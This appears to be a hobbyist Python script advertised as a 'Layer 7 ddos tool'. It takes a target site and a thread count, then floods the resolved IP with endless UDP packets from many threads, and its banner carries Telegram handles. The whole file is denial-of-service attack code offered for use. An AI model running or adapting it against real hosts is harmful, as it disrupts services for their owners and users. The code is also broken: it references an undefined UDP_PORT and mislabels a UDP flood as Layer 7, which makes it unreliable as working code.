print ('''
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | ss.py |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version 1.0 (2023)
						C0d3d by Sm3R
┌─────────────────────────────────────────────┐
│         lotfan be .gov ddos nazanid       │
├─────────────────────────────────────────────┤
│                                │
├─────────────────────────────────────────────┤
│ Telegram : t.me/imsmer │t.me/sm3rmc
└─────────────────────────────────────────────┘''')

import time
import socket
import sys
import _thread

site = input("_>address site ra vared knid => ")
thread_count = input("_>qodrat ra vared knid => ")
ip = socket.gethostbyname(site)
HTTPS_PORT = 443
MESSAGE = '@sm3rmc!!!'
print("_>IP HADAF:", ip)
print("_>PORT HADAF:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("           •HAMLE SHOD•")
       
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
print(''' c0d3d By Sm3R ''')
